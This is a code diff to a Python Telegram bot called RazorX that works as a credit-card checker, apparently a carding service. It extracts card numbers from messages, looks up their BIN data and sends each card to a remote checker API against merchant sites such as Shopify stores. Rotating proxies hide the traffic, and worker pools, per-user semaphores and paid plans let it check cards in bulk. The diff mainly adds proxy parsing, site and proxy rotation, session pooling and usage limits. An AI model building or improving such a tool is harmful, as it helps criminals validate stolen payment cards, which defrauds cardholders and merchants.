@@ -17,8 +17,8 @@ import logging
 import io
 from datetime import datetime, timedelta
 from urllib.parse import urlparse, quote
+from typing import Optional, List
 
-# حاول استدعاء psutil لمراقبة النظام (إن لم يتوفر لن يتوقف البوت)
 try:
     import psutil
     PSUTIL_AVAILABLE = True
@@ -51,7 +51,8 @@ JOIN_CHANNEL_ID = int(os.getenv("JOIN_CHANNEL_ID", 0))
 JOIN_GROUP_LINK = os.getenv("JOIN_GROUP_LINK", "https://t.me/jonvhddrrd")
 JOIN_CHANNEL_LINK = os.getenv("JOIN_CHANNEL_LINK", "https://t.me/hgffrrddrddf")
 
-# --- الإعدادات الصحيحة للـ API والملفات ---
+# --- API ENDPOINTS ---
+API_BASE_URL = os.getenv("API_BASE_URL", "https://web-production-e6929.up.railway.app/shopify")
 CHECKER_API_URL = 'http://62.72.20.10:8081/'
 PROXY_FILE = 'proxy.txt'
 
@@ -59,13 +60,13 @@ PROXY_FILE = 'proxy.txt'
 GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/username/repo/main/sites.txt")
 
 SP_PER_USER_WORKERS = 30
-WORKERS = 70  # سرعة الفحص الجماعي
+WORKERS = 70
 PROXY_PER_USER_WORKERS = 50
 BIN_WORKERS = 20
 
-API_TIMEOUT = 30
+API_TIMEOUT = 25
 BIN_TIMEOUT = 15
-PROXY_TIMEOUT = 15
+PROXY_TIMEOUT = 12
 DELAY = 0.05
 HIT_DELAY = 1.0
 FREE_SP_DAILY_LIMIT = 15
@@ -116,17 +117,6 @@ _DEAD_INDICATORS = (
     'connection timeout failed', 'connection timeout', 'proxy timeout',
     'session_error', 'session error', 'session_expired', 'session expired'
 )
-
-# --- صور GIF الأنمي للصيدات ---
-ANIME_GIFS = [
-    "https://media.giphy.com/media/1n4iuWZFnTeN6qvdpD/giphy.gif",
-    "https://media.giphy.com/media/11KzOet1ElBDz2/giphy.gif",
-    "https://media.giphy.com/media/4ilFRqgbzbx4c/giphy.gif",
-    "https://media.giphy.com/media/xT1R9yebNpKAAJjH0s/giphy.gif",
-    "https://media.giphy.com/media/108BDeJ2BvtZRu/giphy.gif",
-    "https://media.giphy.com/media/F3uJq1J1x0u6k/giphy.gif",
-    "https://media.giphy.com/media/7ZjnR6t2kU2lO/giphy.gif"
-]
 
 # ====================== LOCAL DB HELPERS ======================
 DB_LOCK_MAIN = asyncio.Lock()
@@ -181,9 +171,31 @@ async def get_github_sites():
         
     return _CACHED_SITES
 
-# ====================== UTILITIES ======================
+# ====================== LOGGING & UTILITIES ======================
 log = logging.getLogger("RazorX")
 log.setLevel(logging.INFO)
+_log_fmt = logging.Formatter('[%(asctime)s] [%(levelname)s] %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
+_ch = logging.StreamHandler()
+_ch.setLevel(logging.INFO)
+_ch.setFormatter(_log_fmt)
+log.addHandler(_ch)
+
+def log_system(action, msg, level="info"):
+    getattr(log, level, log.info)(f"[SYSTEM] [{action}] {msg}")
+
+def bs(text):
+    if not text: return text
+    return str(text)
+
+ANIME_GIFS = [
+    "https://media.giphy.com/media/1n4iuWZFnTeN6qvdpD/giphy.gif",
+    "https://media.giphy.com/media/11KzOet1ElBDz2/giphy.gif",
+    "https://media.giphy.com/media/4ilFRqgbzbx4c/giphy.gif",
+    "https://media.giphy.com/media/xT1R9yebNpKAAJjH0s/giphy.gif",
+    "https://media.giphy.com/media/108BDeJ2BvtZRu/giphy.gif",
+    "https://media.giphy.com/media/F3uJq1J1x0u6k/giphy.gif",
+    "https://media.giphy.com/media/7ZjnR6t2kU2lO/giphy.gif"
+]
 
 async def fetch_random_gif():
     try:
@@ -198,21 +210,36 @@ async def fetch_random_gif():
 
 ACTIVE_MTXT_PROCESSES = {}
 USER_APPROVED_PREF = {}
+MAINTENANCE_FILE = "maintenance.json"
 _FREE_SP_USAGE = {}
 _FREE_SP_LAST_USE = {}
 HIT_BUTTON = [[Button.url("Razor X", "https://t.me/Razor_x_1998_bot")]]
 BOT_START_TIME = time.time()
 
-# ====================== HTTP SESSIONS ======================
+# ====================== HTTP SESSIONS & SEMAPHORES ======================
 _USER_HTTP_SESSIONS = {}
+_GLOBAL_BIN_SESSION = None
+_GLOBAL_PROXY_SESSION = None
+_USER_SEMS = {}
 _BIN_SEM = asyncio.Semaphore(BIN_WORKERS)
+
+def get_user_sem(uid, sem_type="msp"):
+    key = f"{uid}_{sem_type}"
+    if key not in _USER_SEMS:
+        limits = {"sp": 30, "msp": WORKERS, "proxy": 50}
+        _USER_SEMS[key] = asyncio.Semaphore(limits.get(sem_type, 30))
+    return _USER_SEMS[key]
+
+def cleanup_user_sem(uid):
+    for k in list(_USER_SEMS.keys()):
+        if k.startswith(f"{uid}_"): del _USER_SEMS[k]
 
 async def get_user_http_session(uid, purpose="general"):
     key = f"{uid}_{purpose}"
     session = _USER_HTTP_SESSIONS.get(key)
     if session is None or session.closed:
         connector = aiohttp.TCPConnector(limit=0, ssl=False, force_close=False)
-        session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=API_TIMEOUT), connector=connector)
+        session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=API_TIMEOUT, connect=10), connector=connector)
         _USER_HTTP_SESSIONS[key] = session
     return session
 
@@ -223,7 +250,38 @@ async def cleanup_user_http_session(uid, purpose="general"):
         try: await session.close()
         except: pass
 
-# ====================== EXTRACTION ======================
+async def get_bin_session():
+    global _GLOBAL_BIN_SESSION
+    if _GLOBAL_BIN_SESSION is None or _GLOBAL_BIN_SESSION.closed:
+        _GLOBAL_BIN_SESSION = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=BIN_TIMEOUT, connect=5), connector=aiohttp.TCPConnector(limit=50, limit_per_host=20, ttl_dns_cache=300, use_dns_cache=True))
+    return _GLOBAL_BIN_SESSION
+
+async def get_proxy_session():
+    global _GLOBAL_PROXY_SESSION
+    if _GLOBAL_PROXY_SESSION is None or _GLOBAL_PROXY_SESSION.closed:
+        _GLOBAL_PROXY_SESSION = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=PROXY_TIMEOUT, connect=10), connector=aiohttp.TCPConnector(limit=30, limit_per_host=10, ttl_dns_cache=300, use_dns_cache=True))
+    return _GLOBAL_PROXY_SESSION
+
+def _get_today_key(): return datetime.now().strftime("%Y-%m-%d")
+def get_free_sp_usage(user_id):
+    today = _get_today_key()
+    entry = _FREE_SP_USAGE.get(user_id)
+    if not entry or entry.get("date") != today:
+        _FREE_SP_USAGE[user_id] = {"date": today, "count": 0}
+        return 0
+    return entry["count"]
+def increment_free_sp_usage(user_id):
+    today = _get_today_key()
+    entry = _FREE_SP_USAGE.get(user_id)
+    if not entry or entry.get("date") != today: _FREE_SP_USAGE[user_id] = {"date": today, "count": 1}
+    else: _FREE_SP_USAGE[user_id]["count"] += 1
+def get_free_sp_cooldown_remaining(user_id):
+    last = _FREE_SP_LAST_USE.get(user_id, 0)
+    elapsed = time.time() - last
+    return 0 if elapsed >= FREE_SP_COOLDOWN else round(FREE_SP_COOLDOWN - elapsed, 1)
+def set_free_sp_last_use(user_id): _FREE_SP_LAST_USE[user_id] = time.time()
+
+# ====================== EXTRACTION & PARSING ======================
 def extract_cc(text):
     if not text: return []
     cards = []
@@ -236,22 +294,86 @@ def extract_cc(text):
         for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2})(\d{3,4})', text): cards.append(f"{c}|{m}|20{y}|{cv}")
     return list(dict.fromkeys(cards))
 
-def get_txt_proxies():
-    if not os.path.exists(PROXY_FILE): return []
+def parse_proxy_format(proxy):
+    proxy = proxy.strip()
+    pt = 'http'
+    pm = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
+    if pm: pt, proxy = pm.group(1).lower(), pm.group(2)
+    h = p = u = pw = ''
+    m = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
+    if m:
+        u, pw, h, p = m.groups()
+    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
+        m2 = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)
+        ph, pp, pu, ppw = m2.groups()
+        if 0 < int(pp) <= 65535: h, p, u, pw = ph, pp, pu, ppw
+    elif re.match(r'^([^:@]+):(\d+)$', proxy):
+        m3 = re.match(r'^([^:@]+):(\d+)$', proxy)
+        h, p = m3.groups()
+    else: return None
+    if not h or not p: return None
     try:
-        with open(PROXY_FILE, 'r', encoding='utf-8', errors='ignore') as f:
+        if not (0 < int(p) <= 65535): return None
+    except: return None
+    pu = f'{pt}://{u}:{pw}@{h}:{p}' if u and pw else f'{pt}://{h}:{p}'
+    return {'ip': h, 'port': p, 'username': u or None, 'password': pw or None, 'proxy_url': pu, 'type': pt}
+
+def get_file_lines(filepath):
+    if not os.path.exists(filepath): return []
+    try:
+        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
             return [line.strip() for line in f if line.strip()]
     except Exception: return []
 
-# ====================== CHECKERS (THE REAL API) ======================
-def is_dead_site_error(error_msg):
-    if not error_msg: return True
-    return any(keyword in str(error_msg).lower() for keyword in _DEAD_INDICATORS)
+def get_txt_proxies():
+    proxies = []
+    for line in get_file_lines(PROXY_FILE):
+        p = parse_proxy_format(line)
+        if p: proxies.append(p)
+    return proxies
+
+# ====================== ROTATOR ======================
+class SmartRotator:
+    def __init__(self): self._site_fails = {}; self._proxy_fails = {}; self._site_idx = 0; self._proxy_idx = 0
+    def pick_site(self, sites, exclude=None):
+        if not sites: return None
+        exclude = exclude or set()
+        available = [s for s in sites if s not in exclude and self._site_fails.get(s, 0) < 5]
+        if not available: available = [s for s in sites if s not in exclude]
+        if not available: available = list(sites)
+        self._site_idx = (self._site_idx + 1) % len(available)
+        return available[self._site_idx]
+    
+    def pick_proxy(self, proxies, exclude=None):
+        if not proxies: return None
+        exclude = exclude or set()
+        available = [p for p in proxies if p.get('proxy_url') not in exclude and self._proxy_fails.get(p.get('proxy_url'), 0) < 3]
+        if not available: available = [p for p in proxies if p.get('proxy_url') not in exclude]
+        if not available: available = list(proxies)
+        self._proxy_idx = (self._proxy_idx + 1) % len(available)
+        return available[self._proxy_idx]
+        
+    def report_site_ok(self, site): self._site_fails[site] = 0
+    def report_site_fail(self, site): self._site_fails[site] = self._site_fails.get(site, 0) + 1
+    def report_proxy_ok(self, proxy_url):
+        if proxy_url: self._proxy_fails[proxy_url] = 0
+    def report_proxy_fail(self, proxy_url):
+        if proxy_url: self._proxy_fails[proxy_url] = self._proxy_fails.get(proxy_url, 0) + 1
+
+# ====================== API CHECKERS ======================
+async def test_proxy(proxy_url):
+    try:
+        s = await get_proxy_session()
+        async with s.get('http://api.ipify.org?format=json', proxy=proxy_url, timeout=aiohttp.ClientTimeout(total=PROXY_TIMEOUT)) as r:
+            if r.status == 200: return True, (await r.json()).get('ip', '?')
+            return False, None
+    except: return False, None
 
 async def get_bin_info(cn):
     try:
-        async with aiohttp.ClientSession() as s:
-            async with s.get(f'https://bins.antipublic.cc/bins/{cn[:6]}', timeout=10) as r:
+        s = await get_bin_session()
+        async with _BIN_SEM:
+            async with s.get(f'https://bins.antipublic.cc/bins/{cn[:6]}') as r:
                 if r.status != 200: return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
                 d = await r.json(content_type=None)
                 return {
@@ -264,14 +386,13 @@ async def get_bin_info(cn):
                 }
     except: return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
 
+def is_dead_site_error(error_msg):
+    if not error_msg: return True
+    return any(keyword in str(error_msg).lower() for keyword in _DEAD_INDICATORS)
+
 async def check_card_api(card, site, proxy, session):
     try:
-        parts = card.split('|')
-        if len(parts) != 4:
-            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card, 'proxy': proxy}
-
         params = {'cc': card, 'url': site, 'proxy': proxy}
-        
         async with session.get(CHECKER_API_URL, params=params) as resp:
             raw = await resp.json(content_type=None)
 
@@ -476,7 +597,7 @@ async def _check_free_limits(event, uid, plan, is_group):
             return False
     return True
 
-# ====================== COMMANDS ======================
+# ====================== COMMANDS (USER) ======================
 @client.on(events.NewMessage(pattern=r'(?i)^[/.](start|cmds?|commands?)$'))
 async def start(event):
     try:
@@ -576,6 +697,7 @@ async def info_cmd(event):
         limit_text = f"<code>{get_cc_limit(plan, event.sender_id)}</code>" if is_paid_plan(plan) else f"<code>{FREE_SP_DAILY_LIMIT}/day (group)</code>"
         used_today = get_free_sp_usage(event.sender_id)
         usage_line = f"\n{PE} <b>Used Today:</b> <code>{used_today}/{FREE_SP_DAILY_LIMIT}</code>" if not is_paid_plan(plan) and event.sender_id not in ADMIN_ID else ""
+        
         await styled_reply(event, f"""{PE} <b>Profile</b> {PE}\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>ID:</b> <code>{event.sender_id}</code>\n{PE} <b>Status:</b> <code>{status}</code>\n{PE} <b>Plan:</b> {plan_emoji} <b>{plan.upper()}</b>\n{PE} <b>Expiry:</b> <code>{exp_str}</code>\n{PE} <b>Limit:</b> {limit_text}{usage_line}\n{PE} <b>Proxies:</b> <code>{pc}/100</code>""", emoji_ids=[CE["fire"], CE["fire"], CE["info"], CE["star"], CE["crown"], CE["chart"], CE["shield"]])
     except Exception as e: await event.reply(f"⚠️ Error in /info: {e}")
 
@@ -690,7 +812,7 @@ async def single_cc_check(event):
                 if proxies: break
 
         proxies.extend(get_txt_proxies())
-        proxies = list({p['proxy_url']: p for p in proxies if p}.values())
+        proxies = [p['proxy_url'] for p in proxies if p]
 
         rm = await event.get_reply_message() if event.reply_to_msg_id else None
         
@@ -986,7 +1108,7 @@ async def _handle_plan_assign(event, plan_key):
     await set_user_plan(target_uid, pi["tier"], pi["duration_days"])
     expiry_date = (datetime.now() + timedelta(days=pi["duration_days"])).strftime('%Y-%m-%d %H:%M:%S')
     
-    # 🌟 هنا الرد الواحد فقط للمشرف
+    # 🌟 الرد الواحد فقط
     await styled_reply(event, f"""<b>✅ Plan Updated</b>\n<a href='https://t.me/Dddadddyttt'>⊀</a> <b>User</b> ↬ <a href='tg://user?id={target_uid}'>{target_name}</a>\n<a href='https://t.me/Dddadddyttt'>⊀</a> <b>Plan</b> ↬ {pi['emoji']} <b>{pi['name']}</b>\n<a href='https://t.me/Dddadddyttt'>⊀</a> <b>Duration</b> ↬ <code>{pi['duration_days']} days</code>\n<a href='https://t.me/Dddadddyttt'>⊀</a> <b>Expires</b> ↬ <code>{expiry_date}</code>""")
     
     try: await styled_send(target_uid, f"""<b>🎉 Plan Upgraded! 🎉</b>\n{pi['emoji']} <b>{pi['name']}</b> ━ <code>{pi['duration_days']}d</code>\nLimit: {get_cc_limit(pi['tier'])} CCs\nExpires: {expiry_date}""")
